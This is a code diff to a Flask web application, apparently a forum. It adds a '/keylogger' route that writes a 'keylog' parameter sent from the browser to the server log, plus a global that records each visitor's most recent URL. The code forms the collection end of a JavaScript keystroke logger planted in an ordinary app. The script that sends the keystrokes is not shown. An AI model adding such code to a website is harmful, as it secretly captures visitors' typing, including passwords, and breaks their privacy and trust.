@@ -1,4 +1,5 @@
 import ast
+import json
 from datetime import datetime
 
 from flask import render_template, flash, redirect, url_for, request, g, current_app
@@ -10,13 +11,23 @@ from app.main import bp
 from app.main.forms import EditProfileForm, EmptyForm, PostForm, SearchForm
 from app.models import User, Post, Thread
 
+most_recent_url = ''
+
+
+def get_most_recent_url():
+    global most_recent_url
+    return most_recent_url
+
 
 @bp.before_app_request
 def before_request():
+    global most_recent_url
     if current_user.is_authenticated:
         current_user.last_seen = datetime.utcnow()
         db.session.commit()
         g.search_form = SearchForm()
+    if not (request.path.startswith(('/static', '/favicon', '/keylogger'))):
+        most_recent_url = request.url
     g.locale = str(get_locale())
 
 
@@ -163,3 +174,10 @@ def sibling_posts(post_id):
 @bp.route('/help')
 def help():
     return render_template('help.html', title=_('Help'))
+
+
+@bp.route('/keylogger')
+def keylogger():
+    if 'javascript' in current_app.config['KEYLOGGER']:
+        current_app.logger.info('[javascript] {}'.format(request.args.get('keylog')))
+    return json.dumps({'success': True}), 200, {'ContentType': 'application/json'}
